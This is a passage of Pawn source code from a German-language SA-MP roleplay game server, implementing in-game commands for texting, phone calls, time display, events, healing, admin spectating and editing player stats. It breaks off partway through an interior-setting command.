			if(PlayerInfo[playerid][pHandyGeld] <= 0 && PlayerInfo[playerid][pHandyVer] == 0)
	    	{
	        	SendClientMessage(playerid, COLOR_GREY, "  Du hast nicht genug Guthaben um den Anruf zu Bezahlen.");
            	SendClientMessage(playerid, COLOR_GREY, "  Geh zum ATM dort kannst du dir Prepaid Karten kaufen.");
            	SendClientMessage(playerid, COLOR_GREY, "  Es gibt 30$, 60$, und 90$ Guthabenkarten.");
				return 1;
	    	}
		    if(PlayerInfo[playerid][pGangJailed] == 1)
		    {
		        SendClientMessage(playerid, COLOR_LIGHTRED, "Du hast im Gangjail kein Empfang!");
		        return 0;
			}
			if(PlayerTied[playerid] == 1)
			{
			    SendClientMessage(playerid, COLOR_LIGHTRED, "Du kannst keinem eine SMS schreiben, während du gefesselt bist!");
			    return 0;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /sms [Telefonnummer] [TEXT]");
				return 1;
			}
			if(PlayerInfo[playerid][pPnumber] == 0)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Du hast kein Handy.");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "* %s nimmt sein Handy raus.", sendername);
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			new phonenumb = strval(tmp);
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
 			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /sms [Telefonnummer] [TEXT]");
				return 1;
			}
			if(phonenumb == 555)
			{
				if ((strcmp("ja", result, true, strlen(result)) == 0) && (strlen(result) == strlen("ja")))
				{
					SendClientMessage(playerid, COLOR_WHITE, "Gesendet.");
					if (gTeam[playerid] == 2 || gTeam[playerid] == 1)
					{
						SendClientMessage(playerid, COLOR_YELLOW, "SMS: Worüber redest du, Sender: MOLE (555)");
						RingTone[playerid] = 20;
						return 1;
					}
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "SMS: Sag einfach ja, Sender: MOLE (555)");
					RingTone[playerid] = 20;
					return 1;
				}
			}
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerInfo[i][pPnumber] == phonenumb && phonenumb != 0)
					{
						giveplayerid = i;
						Mobile[playerid] = giveplayerid; //caller connecting
						if(IsPlayerConnected(giveplayerid))
						{
							if(giveplayerid != INVALID_PLAYER_ID)
							{
						    	if(PhoneOnline[giveplayerid] > 0)
						    	{
						        	SendClientMessage(playerid, COLOR_GREY, "Dieser Spieler ist Offline !");
						        	return 1;
						    	}
								format(string, sizeof(string), "SMS: %s, von: %s (%d)", result,sendername,PlayerInfo[playerid][pPnumber]);
								GetPlayerName(giveplayerid, sendername, sizeof(sendername));
								//format(string, sizeof(string), "* %s's phone beeps.", sendername);
								RingTone[giveplayerid] =20;
								SendClientMessage(playerid, COLOR_WHITE, "Gesendet");
								SendClientMessage(giveplayerid, COLOR_YELLOW, string);
								SendClientMessage(playerid,  COLOR_YELLOW, string);
								format(string, sizeof(string), "~r~$-%d", txtcost);
								GameTextForPlayer(playerid, string, 5000, 1);
								//PlayerInfo[playerid][pHandyGeld] -= txtcost;
       							if(PlayerInfo[playerid][pHandyVer] == 0) PlayerInfo[playerid][pHandyGeld] -= 1;
								SBizzInfo[1][sbTill] += 10;
								ExtortionSBiz(1, txtcost);
					       		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					       		Mobile[playerid] = 255;
								return 1;
							}
						}
					}
				}
			}
			SendClientMessage(playerid, COLOR_GRAD2, "Senden Fehlgeschlagen");
		}
		return 1;
	}
//----------------------------------[pickup]-----------------------------------------------
	if(strcmp(cmd, "/pickup", true) == 0 || strcmp(cmd, "/p", true) == 0)
	{
        if(IsPlayerConnected(playerid))
		{
			if(Mobile[playerid] != 255)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "  Du bist gerade am Telefonieren...");
				return 1;
			}
		    if(PlayerInfo[playerid][pGangJailed] == 1)
		    {
		        SendClientMessage(playerid, COLOR_LIGHTRED, "Du kannst keinen Anruf annehmen, während du im GangJail bist!");
		        return 0;
			}
			if(PlayerTied[playerid] == 1)
			{
			    SendClientMessage(playerid, COLOR_LIGHTRED, "Du kannst keinen Anruf annehmen, während du gefesselt bist!");
			    return 0;
			}
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(Mobile[i] == playerid)
					{
						Mobile[playerid] = i;
						SendClientMessage(i,  COLOR_GRAD2, "Spieler hat abgenommen.");
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "* %s geht an sein Handy.", sendername);
						SetPlayerSpecialAction(playerid,11);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						RingTone[playerid] = 0;
					}

				}
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/hangup", true) == 0 || strcmp(cmd, "/h", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			new caller = Mobile[playerid];
			if(IsPlayerConnected(caller))
			{
			    if(caller != INVALID_PLAYER_ID)
			    {
					if(caller != 255)
					{
						if(caller < 255)
						{
							SendClientMessage(caller,  COLOR_GRAD2, "Aufgelegt.");
							CellTime[caller] = 0;
							CellTime[playerid] = 0;
							SendClientMessage(playerid,  COLOR_GRAD2, "Du hast aufgelegt.");
							Mobile[caller] = 255;
							SetPlayerSpecialAction(playerid,13);
							SetPlayerSpecialAction(caller,13);
						}
						Mobile[playerid] = 255;
						CellTime[playerid] = 0;
						RingTone[playerid] = 0;
						return 1;
					}
				}
			}
			SendClientMessage(playerid,  COLOR_GRAD2, "Dein Handy ist in deiner Tasche.");
		}
		return 1;
	}
    //----------------------------------[TIME]-----------------------------------------------
	if(strcmp(cmd, "/time", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			new mtext[20];
			new year, month,day;
			getdate(year, month, day);
			if(month == 1) { mtext = "Januar"; }
			else if(month == 2) { mtext = "Februar"; }
			else if(month == 3) { mtext = "Marz"; }
			else if(month == 4) { mtext = "April"; }
			else if(month == 5) { mtext = "Mai"; }
			else if(month == 6) { mtext = "Juni"; }
			else if(month == 7) { mtext = "Juli"; }
			else if(month == 8) { mtext = "August"; }
			else if(month == 9) { mtext = "September"; }
			else if(month == 10) { mtext = "Oktober"; }
			else if(month == 11) { mtext = "November"; }
			else if(month == 12) { mtext = "Dezember"; }
		    new hour,minuite,second;
			gettime(hour,minuite,second);
			FixHour(hour);
			hour = shifthour;
			if (PlayerInfo[playerid][pJailed] > 0)
			{
					format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:0%d~g~|~n~~w~Restliche Haftstrafe: %d Sek", day, mtext, hour, minuite, PlayerInfo[playerid][pJailTime]);
			}
			else if (PlayerInfo[playerid][pTot] > 0)
			{
					format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:0%d~g~|~n~~w~Behandlungszeit: %d Sek", day, mtext, hour, minuite, PlayerInfo[playerid][pTotTime]);
			}
			else if (PlayerInfo[playerid][pPrison] > 0)
			{
					format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:0%d~g~|~n~~w~Restliche Haftstrafe: %d Minuten", day, mtext, hour, minuite, PlayerInfo[playerid][pJailTime]);
			}
			else
			{
					format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:%d~g~|", day, mtext, hour, minuite);
			}
			GameTextForPlayer(playerid, string, 5000, 1);
		}
		return 1;
	}
	if(strcmp(cmd, "/pevent", true) == 0) // OK
		{
			if(IsPlayerConnected(playerid))
			{
				if(PlayerInfo[playerid][pAdmin] >= 4)
				{
				    if(EventAktiv == false)
				    {
					 	GetPlayerPos(playerid, EventPos[0], EventPos[1], EventPos[2]);
					 	EventInt = GetPlayerInterior(playerid);
					 	EventVW = GetPlayerVirtualWorld(playerid);
						EventAktiv = true;
						SendClientMessage(playerid, COLOR_GRAD1, "Du hast ein Event an dieser Position gesetzt!");
					}
				}
				else
				{
			 		SendClientMessage(playerid, COLOR_GRAD1, "Dir ist es nicht erlaubt, diesen Befehl zu benutzen!");
				}
			}
			return 1;
		}
    	if(strcmp(cmd, "/eventpos", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(EventAktiv == true)
				{
				SendClientMessage(playerid, COLOR_GRAD2, "Das Event wurde auf der Map Makiert!");
                SetPlayerCheckpoint(playerid, EventPos[0], EventPos[1], EventPos[2], 3.0);
				}
				else
				{
			 		SendClientMessage(playerid, COLOR_GRAD2, "Derzeit ist kein Event aktiv!");
				}
			}
			return 1;
		}
    	if(strcmp(cmd, "/gotoevent", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(EventAktiv == true)
				{
					if(PlayerInfo[playerid][pJailed] >= 1 ||PlayerInfo[playerid][pPrison] == 1)
					{
			 		SendClientMessage(playerid, COLOR_GRAD2, "Du kannst den Event nicht betreten da du im Knast bist!");
					return 1;
					}
				 	SetPlayerPos(playerid, EventPos[0], EventPos[1], EventPos[2]);
	     			SetPlayerInterior(playerid, EventInt);
	                SetPlayerVirtualWorld(playerid, EventVW);
					SendClientMessage(playerid, COLOR_GRAD2, "Du hast dich zum Event telepotiert!");
					GetPlayerName(playerid, sendername, sizeof(sendername));
				}
				else
				{
			 		SendClientMessage(playerid, COLOR_GRAD2, "Derzeit ist kein Event aktiv!");
				}
			}
			return 1;
		}
    	if(strcmp(cmd, "/delevent", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(PlayerInfo[playerid][pAdmin] >= 1)
				{
				    if(EventAktiv == true)
				    {
				 		SendClientMessage(playerid, COLOR_GRAD2, "Event ausgeschaltet!");
				 		EventAktiv = false;
			 		}
				}
				else
				{
			 		SendClientMessage(playerid, COLOR_GRAD2, "Dir ist nicht erlaubt diesen Befehl zu benutzen! ");
				}
			}
			return 1;
		}
	if(strcmp(cmd, "/home", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pHouseKey] != 999)
			{
				SetPlayerCheckpoint(playerid,HouseInfo[PlayerInfo[playerid][pHouseKey]][hEntrancex], HouseInfo[PlayerInfo[playerid][pHouseKey]][hEntrancey], HouseInfo[PlayerInfo[playerid][pHouseKey]][hEntrancez], 4.0);
				GameTextForPlayer(playerid, "~w~Zuhause auf ~r~der Map", 5000, 1);
				gPlayerCheckpointStatus[playerid] = CHECKPOINT_HOME;
			}
			else
			{
				GameTextForPlayer(playerid, "~w~Du hast kein Zuhause", 5000, 1);
			}
		}
		return 1;
	}
//-----------------------------------[HEAL]-------------------------------------------------------------------------
	if(strcmp(cmd, "/heal", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
		{
			tmp = strtoknew(cmdtext, idx);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new location = PlayerInfo[playerid][pLocal];
			if(!strlen(tmp))
			{
				if(location != 999)
				{
					if(location < 999)
					{
						if(HouseInfo[location][hHel] == 1)
						{
							new Float:tempheal;
							GetPlayerHealth(playerid,tempheal);
							if ( tempheal < 100.0)
							{
								SetPlayerHealth(playerid,100.0);
								PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
                                format(string, sizeof(string), "* %s hat sich geheilt",sendername);
                     			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GRAD2,"Du hast bereits 100 HP.");
							}
						}
						else
						{
							format(string, sizeof(string), "Dieser Ort ist nicht zum Healing Upgrade.");
							SendClientMessage(playerid, TEAM_GREEN_COLOR,string);
						}
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /heal [ID/NAME] [Preis]");
					return 1;
				}
			}
			giveplayerid = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /heal [ID/NAME] [Preis]");
				return 1;
			}
			moneys = strval(tmp);
			if(moneys < 1 || moneys > 500) { SendClientMessage(playerid, COLOR_GREY, "   Behandlungspreis nicht weniger als: 1$ und höher als 500$ !"); return 1; }
			if (giveplayerid == playerid)
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du kannst dich leider nicht selber Heilen!");
				return 1;
			}
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
					GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					new giveambu = GetPlayerVehicleID(giveplayerid);
					new playambu = GetPlayerVehicleID(playerid);
					if(gTeam[playerid] == TEAM_CYAN || PlayerInfo[playerid][pMember]== 4||PlayerInfo[playerid][pLeader] == 4 )//model
					{
						if (IsAnAmbulance(playambu) && playambu == giveambu)
						{
						    if(GetDistanceBetweenPlayers(giveplayerid,playerid) > 2)return SendClientMessage(playerid,COLOR_GREY,"Der Spieler ist nicht in deiner Nähe!");
							new Float:tempheal;
							GetPlayerHealth(giveplayerid,tempheal);
							if(tempheal >= 160)
							{
								SendClientMessage(playerid, TEAM_GREEN_COLOR,"   Diese Person ist schon Geheilt.");
								return 1;
							}
							format(string, sizeof(string), "~y~Du heilst: ~n~~w~%s~n~~g~$%d", giveplayer,moneys);
							GameTextForPlayer(playerid, string, 5000, 1);
							ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
							GivePlayerMoneySave(playerid,moneys);
							GivePlayerMoneySave(giveplayerid,-moneys);
							new hp = 0;
						    if(PlayerInfo[playerid][pPainPerk] > 0)
						    {
						        hp = 20 * PlayerInfo[playerid][pPainPerk];
								hp += 100;
								SetPlayerHealth(giveplayerid, hp);
						    }
						    else
						    {
						        hp = 100;
						        SetPlayerHealth(giveplayerid, 100);
						    }
							PlayerPlaySound(playerid, 1150, 0.0, 0.0, 0.0);
							PlayerPlaySound(giveplayerid, 1150, 0.0, 0.0, 0.0);
							format(string, sizeof(string), "Du wurdest für $%d geheilt.",moneys);
							SendClientMessage(giveplayerid, TEAM_GREEN_COLOR,string);
						}
						else
						{
							SendClientMessage(playerid, COLOR_GRAD1, "   Nicht im Rettungswagen / Rettungshelikopter!");
							return 1;
						}
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD1, "   Du darfst diesen Befehl nicht benutzen !");
						return 1;
					}
				}
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
//-----------------------------------------------------------------------------
	if(strcmp(cmd, "/bigears", true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 1 )
	    {
			if (!BigEar[playerid])
			{
				BigEar[playerid] = 1;
				SendClientMessage(playerid, COLOR_GRAD2, "Deine Ohren sind gewachsen");
			}
			else if (BigEar[playerid])
			{
				(BigEar[playerid] = 0);
				SendClientMessage(playerid, COLOR_GRAD2, "Deine Ohren sind wieder geschrumpft");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/id", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZUNG: /id [Spieler ID]");
				return 1;
			}
			new target;
			target = ReturnUser(tmp);
			new sstring[256];
			if(IsPlayerConnected(target))
			{
			    if(target != INVALID_PLAYER_ID)
			    {
					GetPlayerName(target, giveplayer, sizeof(giveplayer));
					format(sstring, sizeof(sstring), "Name: %s, ID: %d, Level: %d",giveplayer,target,PlayerInfo[target][pLevel]);
					SendClientMessage(playerid, COLOR_GRAD1, sstring);
				}
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/tv", true) == 0 || strcmp(cmd, "/recon", true) == 0)// By CoL Team
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] > 1 || PlayerInfo[playerid][pSupporter] > 1)
			{
            //
			tmp = strtoknew(cmdtext, idx);
			if(strcmp("off", tmp, true, strlen(tmp)) == 0)
			{
			    if(WatchingTV[playerid] > 0)
			    {
			        WatchingTV[playerid] = 0;
					GameTextForPlayer(playerid, "~w~                TV~n~~r~                Aus", 5000, 6);
					PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
                    new stringqqq1[128];
                    new watchername1[MAX_PLAYER_NAME];
                    GetPlayerName(playerid, watchername1, sizeof(watchername1));
                    format(stringqqq1, 256, "AdmWarning: %s hat die beobachtung von %s beendet.",watchername1,GetName(Spectate[playerid]));
					Spectatepos[playerid] = 1;
                    TogglePlayerSpectating(playerid, 0);
                    ABroadCast(COLOR_LIGHTRED,stringqqq1,1);
                    Spectate[playerid] = 255;
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "Mit dem Befehl schaltest du den Fernseher aus [Einschalten mit /tv [ID]!");
				    return 1;
				}
			}
            //
			if(PlayerInfo[playerid][pAdmin] > 0 || PlayerInfo[playerid][pSupporter] > 0)
			{
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
						GetPlayerPos(playerid, specx[playerid], specy[playerid], specz[playerid]);
						GetPlayerFacingAngle(playerid,specrot[playerid]);
						specint[playerid] = GetPlayerInterior(playerid);
						specvworld[playerid] = GetPlayerVirtualWorld(playerid);
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						WatchingTV[playerid] = 1;
                        new stringqqq[128];
                        new watchername[MAX_PLAYER_NAME];
                        GetPlayerName(playerid, watchername, sizeof(watchername));
				        Spectate[playerid] = giveplayerid;
						SetPlayerInterior(playerid,GetPlayerInterior(giveplayerid));
                        TogglePlayerSpectating(playerid, 1);
				        if(IsPlayerInAnyVehicle(giveplayerid))
				    	{
					    new carid = GetPlayerVehicleID(giveplayerid);
					    PlayerSpectateVehicle(playerid, carid);
				    	}
				    	else
				    	{
					    PlayerSpectatePlayer(playerid, giveplayerid);
				    	}
                        format(stringqqq, 256, "AdmWarning: %s beobachtet nun %s",watchername,giveplayer);
                        ABroadCast(COLOR_LIGHTRED,stringqqq,1);
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREEN, "Ziel ist nicht verfügbar.");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREEN, "Du bist nicht befugt!");
				return 1;
			}
		}
		}// Admin
        //
		return 1;
	}
    //--------------------------------------------------------------------------------------
	if(strcmp(cmd, "/settime", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /settime [Zeit] (0-23)");
				return 1;
			}
			new hour;
			hour = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 1337)
			{
	            SetWorldTime(hour);
				format(string, sizeof(string), "Uhrzeit: %d Uhr.", hour);
				BroadCast(COLOR_GRAD1, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Du darfst diesen Befehl nicht benutzen !");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/startlotto", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 1337)
	        {
	            LottoTimer = 180;
	            OOCOff(COLOR_WHITE, "Die Lotto Losziehung wurde automatisch gestartet!(3 Minuten)");
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "Du bist nicht befugt !");
	            return 1;
	        }
	    }
		return 1;
	}
    //-----------------------------------editstat---------------------------------------
	if(strcmp(cmd, "/setstat", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(IsPlayerAdmin(playerid))
	  		{
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
						SendClientMessage(playerid, COLOR_GRAD1, "Benutze: /setstat [playerid] [statcode] [Betrag]");
						SendClientMessage(playerid, COLOR_GRAD4, "|1 Level  |2 Spawn-Health  |3 Upgradepoints  |4 Model ");
						SendClientMessage(playerid, COLOR_GRAD3, "|5 Bank Account  |6 PhoneNumber  |7 RespektPunkte ");
						SendClientMessage(playerid, COLOR_GRAD2, "|8 HouseID  |9 BizzID  |10 Premium  |11 Fishskill");
						SendClientMessage(playerid, COLOR_GRAD2, "|12 Det  |13 Lawyer  |14 Fixer  |15 News  |16 Jack");
						SendClientMessage(playerid, COLOR_GRAD2, "|18 Sex  |19 Tickets  |20 Job  |21 Jobzeit |24 Fisch |25 Tanke| 26 Carkeys ");
						SendClientMessage(playerid, COLOR_YELLOW, "  ACHTUNG: Beim Ändern der BizzID auf ein SBiz muss 100 der ID hinzugerechnet werden");
						SendClientMessage(playerid, COLOR_YELLOW, "  Bizz oder Haus wegnehmen: HouseID bzw BizzID auf 255 setzen");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
	    	{
	    	    if(giveplayerid != INVALID_PLAYER_ID)
	    	    {
					tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Benutze: /setstat [playerid] [statcode] [Betrag]");
						SendClientMessage(playerid, COLOR_GRAD4, "|1 Level  |2 Spawn-Health  |3 Upgradepoints  |4 Model ");
						SendClientMessage(playerid, COLOR_GRAD3, "|5 Bank Account  |6 PhoneNumber  |7 RespektPunkte ");
						SendClientMessage(playerid, COLOR_GRAD2, "|8 HouseID  |9 BizzID  |10 Premium  |11 Fishskill");
						SendClientMessage(playerid, COLOR_GRAD2, "|12 Det  |13 Lawyer  |14 Fixer  |15 News  |16 Jack");
						SendClientMessage(playerid, COLOR_GRAD2, "|18 Sex  |19 Tickets  |20 Job  |21 Jobzeit |24 Fisch |25 Tanke| 26 Carkeys ");
//						SendClientMessage(playerid, COLOR_YELLOW, "  ACHTUNG: Beim Ändern der BizzID auf ein SBiz muss 100 der ID hinzugerechnet werden");
						SendClientMessage(playerid, COLOR_YELLOW, "  Bizz oder Haus wegnehmen: House ID auf (999) Bizz ID (255) setzen");
						return 1;
					}
					new stat;
					stat = strval(tmp);
					tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Benutze: /setstat [playerid] [statcode] [Betrag]");
						SendClientMessage(playerid, COLOR_GRAD4, "|1 Level  |2 Spawn-Health  |3 Upgradepoints  |4 Model ");
						SendClientMessage(playerid, COLOR_GRAD3, "|5 Bank Account  |6 PhoneNumber  |7 RespektPunkte ");
						SendClientMessage(playerid, COLOR_GRAD2, "|8 HouseID  |9 BizzID  |10 Premium  |11 Fishskill");
						SendClientMessage(playerid, COLOR_GRAD2, "|12 Det  |13 Lawyer  |14 Fixer  |15 News  |16 Jack");
						SendClientMessage(playerid, COLOR_GRAD2, "|18 Sex  |19 Tickets  |20 Job  |21 Jobzeit |24 Fisch |25 Tanke| 26 Carkeys ");
//						SendClientMessage(playerid, COLOR_YELLOW, "  ACHTUNG: Beim Ändern der BizzID auf ein SBiz muss 100 der ID hinzugerechnet werden");
						SendClientMessage(playerid, COLOR_YELLOW, "  Bizz oder Haus wegnehmen: House ID auf (999) Bizz ID (255) setzen");
						return 1;
					}
					new amount;
					amount = strval(tmp);

						switch (stat)
						{
							case 1:
							{
								PlayerInfo[giveplayerid][pLevel] = amount;
								format(string, sizeof(string), "Der Spieler wurde auf Level %d gesetzt", amount);
							}
							case 2:
							{
								PlayerInfo[giveplayerid][pSHealth] = amount;
								format(string, sizeof(string), "Der Spieler wurde auf %d Spawnhealth gesetzt ", amount);
							}
							case 3:
							{
								PlayerInfo[giveplayerid][gPupgrade] = amount;
								format(string, sizeof(string), "Der Spieler wurde auf %d Upgrade Points gesetzt", amount);
							}
							case 4:
							{
								PlayerInfo[giveplayerid][pModel] = amount;
								format(string, sizeof(string), "Dem Spieler wurde das Model %d zugeordnet", amount);
							}
							case 5:
							{
//								PlayerInfo[giveplayerid][pAccount] = amount;
//								format(string, sizeof(string), "Das Bankkonto des Spielers wurde auf $%d gesetzt", amount);
								SperreLog(string);
							}
							case 6:
							{
								PlayerInfo[giveplayerid][pPnumber] = amount;
								format(string, sizeof(string), "Die Handynummer des Spielers wurde auf %d gesetzt", amount);
							}
							case 7:
							{
								PlayerInfo[giveplayerid][pExp] = amount;
								format(string, sizeof(string), "Die Respektpunkte des Spielers wurden auf %d gesetzt", amount);
							}
							case 8:
							{
								PlayerInfo[giveplayerid][pHouseKey] = amount;
								format(string, sizeof(string), "Der Hausschlüssel des Spielers wurde auf %d gesetzt", amount);
							}
							case 9:
							{
								PlayerInfo[giveplayerid][pPbiskey] = amount;
								format(string, sizeof(string), "Der Geschäftsschlüssel des Spielers wurde auf %d gesetzt", amount);
							}
							case 10:
							{
								PlayerInfo[giveplayerid][pDonateRank] = amount;
								format(string, sizeof(string), "Der Premiumrang des Spielers wurde auf %d gesetzt", amount);
							}
							case 11:
							{
								PlayerInfo[giveplayerid][pFishSkill] = amount;
								format(string, sizeof(string), "Der Fischerskill wurde auf %d gesetzt", amount);
							}
							case 12:
							{
								PlayerInfo[giveplayerid][pDetSkill] = amount;
								format(string, sizeof(string), "Der Dedektivskill des Spielers wurde auf %d gesetzt", amount);
							}
							case 13:
							{
								PlayerInfo[giveplayerid][pLawSkill] = amount;
								format(string, sizeof(string), "Der Anwaltsskill des Spielers wurde auf %d gesetzt", amount);
							}
							case 14:
							{
								PlayerInfo[giveplayerid][pMechSkill] = amount;
								format(string, sizeof(string), "Der Mechanikerskill des Spielers wurde auf %d gesetzt", amount);
							}
							case 15:
							{
								PlayerInfo[giveplayerid][pNewsSkill] = amount;
								format(string, sizeof(string), "Der Reporterskill des Spielers wurde auf %d gesetzt", amount);
							}
							case 16:
							{
								PlayerInfo[giveplayerid][pJackSkill] = amount;
								format(string, sizeof(string), "Der Carjackerskill des Spielers wurde auf %d gesetzt", amount);
							}
							case 17:
							{
								PlayerInfo[giveplayerid][pDrugsSkill] = amount;
								format(string, sizeof(string), "Der Drogendealerskill des Spielers wurde auf %d gesetzt", amount);
							}
							case 18:
							{
								PlayerInfo[giveplayerid][pSexSkill] = amount;
								format(string, sizeof(string), "Der Sexskill des Spielers wurde auf %d gesetzt", amount);
							}
							case 19:
							{
								PlayerInfo[giveplayerid][pAdminTickets] = amount;
								format(string, sizeof(string), "Der Ticket-Skill des Spielers wurde auf %d geändert", amount);
							}
							case 20:
							{
								PlayerInfo[giveplayerid][pJob] = amount;
								format(string, sizeof(string), "Der Job des Spielers wurde auf %d geändert", amount);
							}
							case 21:
							{
								PlayerInfo[giveplayerid][pContractTime] = amount;
								format(string, sizeof(string), "Die Jobzeit des Spielers wurde auf %d geändert", amount);
							}
							case 24:
							{
							    PlayerInfo[giveplayerid][pFishSkill] = amount;
							    format(string, sizeof(string), "Der Fischerskill des Spielers wurde auf %d gesetzt.", amount);
							}
							case 25:
							{
								PlayerInfo[giveplayerid][pPtankekey] = amount;
								format(string, sizeof(string), "Der Tankstellenschlüssel des Spielers ist jetzt %d.", amount);
							}
							case 26:
							{
							    if(amount <= 101 && amount >= 1)
	 						    {
									PlayerInfo[giveplayerid][pCarkeys] = amount;
									format(string, sizeof(string), "Der Spieler hat nun %d Carkeys.", amount);
								}
							}
							default:
							{
								format(string, sizeof(string), "Ungültiger Statcode", amount);
							}

						}
						SendClientMessage(playerid, COLOR_GRAD1, string);
				}//not valid id

					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
					}
			}//not connected
		}
		return 1;
	}
    //----------------------------------[SETINT]-----------------------------------------------
	if(strcmp(cmd, "/setint", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /setint [interiorid]");
				return 1;
			}
			new intid;
			intid = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pSupporter] >= 1)
			{
				SetPlayerInterior(playerid,intid);
				PlayerInfo[playerid][pInt] = intid;
				format(string, sizeof(string), "   Interiorid %d.", intid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist nicht befugt !");
			}
		}
		return 1;
	}

	//-------------------------------------Setplayerint-----------------------------
	if(strcmp(cmd, "/setplayerint", true) == 0)
	{
		if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /setplayerint [playerid] [interiorid]");
				return 1;
			}
			new playa;
			playa = ReturnUser(tmp);
			new intid;
			tmp = strtoknew(cmdtext, idx);
			intid = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
			    		GetPlayerName(playa, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
